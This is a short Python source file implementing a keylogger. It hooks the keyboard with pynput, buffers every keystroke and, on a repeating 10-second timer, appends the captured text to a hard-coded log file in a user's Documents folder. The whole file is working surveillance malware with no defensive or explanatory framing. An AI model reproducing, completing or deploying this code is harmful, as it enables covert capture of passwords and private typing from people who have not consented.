#! /usr/bin/env python
import pynput.keyboard
import threading
import os



log = ""
class Keylogger:
    def process_key_pressed(self,key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log+" "


    def report(self):
        global log
        check_file = os.path.isfile("/home/vickyvirus/Documents/log.txt")
        if check_file:
            with open("/home/vickyvirus/Documents/log.txt","ab+") as log_file:
                log_file.write("\n".encode())
                log_file.write(log.encode())
                log = ""
                log_file.close()
                timer = threading.Timer(10,self.report)
                timer.start()
        else:
            with open("/home/vickyvirus/Documents/log.txt", "wb") as log_file:
                log_file.write("\n".encode())
                log_file.write(log.encode())
                log = ""
                log_file.close()
                timer = threading.Timer(10, self.report)
                timer.start()


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_pressed)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
